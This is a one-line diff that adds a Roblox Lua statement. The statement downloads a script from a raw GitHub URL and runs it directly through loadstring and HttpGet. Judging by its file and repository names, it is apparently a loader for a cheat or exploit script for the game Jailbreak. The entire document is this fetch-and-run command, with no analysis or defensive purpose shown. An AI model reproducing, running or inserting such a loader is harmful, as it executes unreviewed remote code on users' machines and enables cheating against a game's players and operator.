@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/jailbreak-spam7-ndgag0dcgz5fu1.lua"))()
